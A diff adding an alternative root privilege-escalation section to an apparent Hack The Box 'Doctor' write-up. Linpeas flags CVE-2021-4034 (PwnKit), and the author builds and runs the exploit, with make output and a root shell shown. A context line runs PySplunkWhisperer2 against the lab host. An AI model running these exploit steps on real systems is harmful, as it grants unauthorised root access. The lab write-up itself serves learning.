@@ -357,4 +357,29 @@ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username 
 ```
 
 ![/etc/shadow](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/etc_shadow.png)
+
+### Alternative way of privilege escalation (root)
+Using linpeas, we notice that the server is vulnerable to CVE-2021-4034.
+
+```
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-4034 
+```
+
+Downloading the exploit script to the server and compiling the exploit script, and finally executing the exploit script will then give us root permissions
+
+```
+web@doctor:/tmp/.ICE-unix/exploit/CVE-2021-4034$ make
+make
+cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
+cc -Wall    cve-2021-4034.c   -o cve-2021-4034
+echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
+mkdir -p GCONV_PATH=.
+cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
+web@doctor:/tmp/.ICE-unix/exploit/CVE-2021-4034$ ./cve-2021-4034
+./cve-2021-4034
+# id
+id
+uid=0(root) gid=0(root) groups=0(root),4(adm),1001(web)
+# 
 ```
